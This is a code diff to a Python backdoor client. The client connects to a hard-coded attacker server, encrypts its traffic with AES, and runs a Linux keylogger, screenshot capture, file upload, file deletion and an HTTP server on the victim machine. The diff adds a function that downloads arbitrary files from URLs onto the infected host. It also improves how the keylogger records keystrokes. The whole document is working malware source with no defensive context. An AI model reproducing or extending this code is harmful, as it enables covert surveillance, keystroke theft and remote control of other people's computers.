@@ -3,6 +3,7 @@
 from Crypto.Cipher import AES
 import subprocess, socket, base64, time, os, sys
 import gtk.gdk
+import urllib2
 try:
 	import pyxhook
 except ImportError:
@@ -25,8 +26,8 @@ iv = '1111111111111111'
 cipher = AES.new(secret,AES.MODE_CFB,iv)
 
 # server config
-HOST = '192.168.82.149'
-PORT = 413
+HOST = '192.168.1.104'
+PORT = 8888
 
 # session controller
 active = False
@@ -68,7 +69,6 @@ def Upload(sock, filename):
 	except:
 		time.sleep(0.1)
 	# let server know we're done..
-	print " started sending file"
 	time.sleep(0.8)
 	Send(sock, "")
 	time.sleep(0.8)
@@ -96,6 +96,18 @@ def screenshota():
     	pb.save("screenshot.png","png")
     else:
     	Send(s,"unable to get screen shot \n"+ os.getcwd()+">")
+    	
+ # download file rom url   	
+def downloadhttp(sock, url):
+	# get filename from url
+	filename = url.split('/')[-1].split('#')[0].split('?')[0]
+	g = open(filename, 'wb')
+	# download file
+	u = urllib2.urlopen(url)
+	g.write(u.read())
+	g.close()
+	# let server know we're done...
+	return "Finished download."
 
 
 # Keylogger for linux
@@ -111,10 +123,12 @@ def keylogger():
                 global closevar
             
   		fob=open(log_file,'a')
-                #if event.Key != "Return":
-  		fob.write(event.Key)
+                if event.Key != "Return":
+  		    fob.write(event.Key)
                 if event.Key == "Return":
         	    fob.write('\n')
+                elif event.Key == "space":
+		    fob.write(" ")
 
   	        if   closevar==999: 
                     print "keylogger closing"
@@ -151,11 +165,15 @@ while True:
 			
 			# Receive data
 			data = Receive(s)
-			if data=="keylogger":
+
+			if data=="start http":
+                            data="python -m SimpleHTTPServer 5000"
+
+			elif data=="keylogger":
                                 #closevar=999
 				stdoutput = Upload(s, "file.log")
                                 
-                        if data.startswith("delete ")== True:
+                        elif data.startswith("delete ")== True:
                             dele=str(data[7:])
                             if os.path.exists(dele)==False:
                                 Send(s,"file not found \n"+ os.getcwd()+">")
@@ -167,10 +185,9 @@ while True:
                         
                             
                             	                
-                        if data=="start http":
-                            data="python -m SimpleHTTPServer 5000"
+                       
                         # check for quit
-			if data == "quit" or data == "terminate":
+			elif data == "quit" or data == "terminate":
 			    Send(s, "quitted")
                             #open('file.log', 'w').close()
 			    break
@@ -179,6 +196,9 @@ while True:
 			elif data.startswith("cd ") == True:
 				os.chdir(data[3:])
 				stdoutput = ""
+			elif data.startswith("downloadhttp") == True:
+				# Download from url
+				stdoutput = downloadhttp(s, data[13:])
                         elif data.startswith("download") ==True:
 			# check for download
                             
@@ -209,7 +229,7 @@ while True:
 		# loop ends here
 		if data == "terminate":
 		
-  		    closevar=999	              
+  		    closevar=999              
                     s.shutdown(socket.SHUT_RDWR)
 		    s.close()
                     break
